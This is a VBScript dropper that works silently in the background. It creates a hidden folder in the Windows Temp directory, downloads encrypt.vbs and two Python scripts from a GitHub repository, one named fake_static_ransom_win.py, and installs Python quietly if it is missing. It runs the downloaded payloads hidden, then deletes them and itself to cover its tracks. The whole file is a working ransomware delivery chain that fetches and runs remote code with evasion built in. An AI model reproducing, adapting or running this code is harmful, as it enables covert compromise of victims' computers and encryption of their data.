' Suppress all error popups (script will run silently in background)
On Error Resume Next

Dim objShell, fso, tempDir, configDir, pythonInstaller, pythonPath, pythonExe
Dim downloadCmd, installCmd, runCmd, folderObj

' ---- File names (change these to whatever names you want) ----
Dim filename1, filename2, filename3
filename1 = "fake_static_ransom_win.py"   ' downloaded from url1
filename2 = "auto.py"     ' downloaded from url2
filename3 = "encrypt.vbs"    ' downloaded from url3, runs first with cscript

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If objShell Is Nothing Or fso Is Nothing Then WScript.Quit

' Define paths (using Windows temp instead of user temp)
tempDir = objShell.ExpandEnvironmentStrings("%WINDIR%") & "\Temp"
configDir = tempDir & "\.config"
pythonInstaller = tempDir & "\python-installer.exe"
' Default user-level installation path for Python 3.12
pythonPath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python\Python312"
pythonExe = pythonPath & "\python.exe"

' 1. Create hidden directory
If Not fso.FolderExists(configDir) Then
    fso.CreateFolder(configDir)
End If
Set folderObj = fso.GetFolder(configDir)
folderObj.Attributes = folderObj.Attributes Or 2 ' 2 = Hidden

' 2. Download lala.vbs, run it with cscript, then permanently delete it
Dim url3, path3
url3 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/encrypt.vbs"
path3 = configDir & "\" & filename3

objShell.Run "cmd /c curl -sL -o """ & path3 & """ """ & url3 & """", 0, True
objShell.Run "cmd /c cd /d """ & configDir & """ && cscript //nologo """ & filename3 & """", 0, True
If fso.FileExists(path3) Then fso.DeleteFile path3, True

' 3. Check if Python is already installed, if not, download and install silently
If Not fso.FileExists(pythonExe) Then
    ' Download Python 3.12.2 official installer
    downloadCmd = "cmd /c curl -sL -o """ & pythonInstaller & """ https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
    objShell.Run downloadCmd, 0, True

    ' Install Python silently for current user (No UAC prompt, no window)
    ' InstallAllUsers=0 ensures it installs in %LOCALAPPDATA% and requires no admin rights
    installCmd = "cmd /c """ & pythonInstaller & """ /quiet InstallAllUsers=0 PrependPath=1 Include_test=0"
    objShell.Run installCmd, 0, True
    
    ' Clean up the installer
    fso.DeleteFile pythonInstaller, True
End If

' 4. Download the Python files
Dim url1, url2, path1, path2
url1 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/fake_static_ransom_win.py"
url2 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py"
path1 = configDir & "\" & filename1
path2 = configDir & "\" & filename2

objShell.Run "cmd /c curl -sL -o """ & path1 & """ """ & url1 & """", 0, True
objShell.Run "cmd /c curl -sL -o """ & path2 & """ """ & url2 & """", 0, True

' Apply Hidden attribute to the downloaded files
If fso.FileExists(path1) Then fso.GetFile(path1).Attributes = 2
If fso.FileExists(path2) Then fso.GetFile(path2).Attributes = 2

' 5. Execute Python silently
' Run python.exe with the args, setting the working directory to configDir
Dim args
args = filename2 & " " & filename1 
runCmd = "cmd /c cd /d """ & configDir & """ && """ & pythonExe & """ " & args
objShell.Run runCmd, 0, False

' 6. After everything has finished, permanently delete the downloaded files and this script
WScript.Sleep 5000 ' give Python a moment to load the .py files
If fso.FileExists(path1) Then fso.DeleteFile path1, True
If fso.FileExists(path2) Then fso.DeleteFile path2, True
' Permanently delete this script itself (delayed, so the file is no longer locked)
objShell.Run "cmd /c timeout /t 2 /nobreak >nul & del /f /q """ & WScript.ScriptFullName & """", 0, False
